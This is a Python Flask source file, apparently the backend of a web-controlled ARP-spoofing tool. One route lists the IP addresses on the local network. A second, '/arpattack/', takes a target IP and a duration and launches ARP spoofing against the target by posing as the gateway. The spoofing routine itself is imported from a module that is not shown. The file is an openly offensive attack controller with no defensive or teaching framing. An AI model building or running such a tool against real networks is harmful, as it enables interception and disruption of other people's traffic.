import json
import sys
import traceback

from flask import Flask
from flask import request
from flask_cors import CORS

from tools import get_ip_list
from tools import arpspoof
from tools import get_gateway_ip
from tools import get_cur_ip


app = Flask(__name__)
CORS(app, supports_credentials=True)


@app.route('/', methods=['GET'])
def get_ips():
    '''获取ip列表'''
    try:
        if request.method == 'GET':
            ip_list = get_ip_list()
            if len(ip_list) < 20:
                ip_list = get_ip_list()
            return json.dumps(ip_list)
        else:
            print("func " + sys._getframe().f_code.co_name + " method error")
    except:
        return traceback.print_exc()


@app.route('/arpattack/', methods=['POST'])
def arp_attack():
    '''发起arp攻击'''
    try:
        if request.method == 'POST':
            data = request.get_json()['data']
            # print("data_type: ", data['data'])
            # data = json.loads(data)
            attack_time = int(data['attack_time'])
            target_ip = data['target_ip']
            print(attack_time)
            print(target_ip)

            cur_ip = get_cur_ip()
            gateway_ip = get_gateway_ip()

            arpspoof(gateway_ip, cur_ip, attack_time, target_ip)
            return "arp spoofing...."
        else:
            print("func " + sys._getframe().f_code.co_name + " method error")
    except:
        return traceback.print_exc()


if __name__ == "__main__":
    app.run()
